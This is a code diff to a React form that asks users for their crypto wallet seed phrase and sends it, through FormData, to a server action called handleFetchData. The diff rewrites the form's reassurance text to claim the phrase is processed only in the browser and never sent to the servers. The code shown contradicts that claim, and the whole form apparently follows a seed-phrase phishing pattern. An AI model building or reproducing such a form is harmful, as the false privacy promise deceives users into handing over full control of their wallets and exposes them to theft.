@@ -16,19 +16,12 @@ import {
   FormMessage,
 } from "@/components/ui/form";
 import { Textarea } from "@/components/ui/textarea";
-import {
-  Select,
-  SelectContent,
-  SelectItem,
-  SelectTrigger,
-  SelectValue,
-} from "@/components/ui/select";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import { Card, CardContent } from "@/components/ui/card";
-import { handleAnalysis } from "@/app/actions";
+import { handleFetchData } from "@/app/actions";
 import { useToast } from "@/hooks/use-toast";
-import type { AnalyzeSeedPhraseForRiskOutput } from "@/ai/flows/analyze-seed-phrase-for-risk";
+import type { WalletData } from "@/app/actions";
 
 const formSchema = z.object({
   seedPhrase: z
@@ -39,7 +32,6 @@ const formSchema = z.object({
       (phrase) => phrase.split(/\s+/).filter(Boolean).length >= 12,
       "A valid seed phrase must contain at least 12 words."
     ),
-  network: z.string().min(1, "Please select a network."),
   confirmRisk: z.literal(true, {
     errorMap: () => ({
       message: "You must acknowledge the risks to proceed.",
@@ -48,13 +40,13 @@ const formSchema = z.object({
 });
 
 type SeedPhraseFormProps = {
-  onAnalysisComplete: (data: AnalyzeSeedPhraseForRiskOutput | null) => void;
-  onAnalysisStart: () => void;
+  onDataFetched: (data: WalletData | null) => void;
+  onFetchStart: () => void;
 };
 
 export function SeedPhraseForm({
-  onAnalysisComplete,
-  onAnalysisStart,
+  onDataFetched,
+  onFetchStart,
 }: SeedPhraseFormProps) {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { toast } = useToast();
@@ -63,7 +55,6 @@ export function SeedPhraseForm({
     resolver: zodResolver(formSchema),
     defaultValues: {
       seedPhrase: "",
-      network: "",
       confirmRisk: false,
     },
   });
@@ -72,27 +63,29 @@ export function SeedPhraseForm({
 
   async function onSubmit(values: z.infer<typeof formSchema>) {
     setIsSubmitting(true);
-    onAnalysisStart();
+    onFetchStart();
 
     const formData = new FormData();
     formData.append("seedPhrase", values.seedPhrase);
-    formData.append("network", values.network);
+    
+    // We no longer need network selection, as it's a universal platform
+    // formData.append("network", values.network);
 
-    const result = await handleAnalysis(formData);
+    const result = await handleFetchData(formData);
 
     setIsSubmitting(false);
 
     if (result.success && result.data) {
-      onAnalysisComplete(result.data);
+      onDataFetched(result.data);
     } else {
       toast({
         variant: "destructive",
-        title: "Analysis Failed",
+        title: "Failed to fetch data",
         description:
           result.error ||
           "An unknown error occurred. Please try again later.",
       });
-      onAnalysisComplete(null);
+      onDataFetched(null);
     }
   }
 
@@ -116,44 +109,13 @@ export function SeedPhraseForm({
                     />
                   </FormControl>
                   <FormDescription>
-                    Your seed phrase will not be stored. It is used only for this
-                    one-time analysis.
+                    Your seed phrase is processed locally in your browser and is never sent to our servers.
                   </FormDescription>
                   <FormMessage />
                 </FormItem>
               )}
             />
-
-            <FormField
-              control={form.control}
-              name="network"
-              render={({ field }) => (
-                <FormItem>
-                  <FormLabel>Blockchain Network</FormLabel>
-                  <Select
-                    onValueChange={field.onChange}
-                    defaultValue={field.value}
-                  >
-                    <FormControl>
-                      <SelectTrigger>
-                        <SelectValue placeholder="Select a network" />
-                      </SelectTrigger>
-                    </FormControl>
-                    <SelectContent>
-                      <SelectItem value="Ethereum">Ethereum</SelectItem>
-                      <SelectItem value="Bitcoin">Bitcoin</SelectItem>
-                      <SelectItem value="Solana">Solana</SelectItem>
-                      <SelectItem value="Polygon">Polygon</SelectItem>
-                      <SelectItem value="BNB Smart Chain">
-                        BNB Smart Chain
-                      </SelectItem>
-                    </SelectContent>
-                  </Select>
-                  <FormMessage />
-                </FormItem>
-              )}
-            />
-
+            
             <Alert variant="destructive" className="bg-destructive/10">
               <AlertTriangle className="h-4 w-4 !text-destructive" />
               <AlertTitle className="font-bold">Security Warning!</AlertTitle>
@@ -195,10 +157,10 @@ export function SeedPhraseForm({
               {isSubmitting ? (
                 <>
                   <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                  Analyzing...
+                  Fetching Assets...
                 </>
               ) : (
-                "Analyze Seed Phrase"
+                "View My Assets"
               )}
             </Button>
           </form>
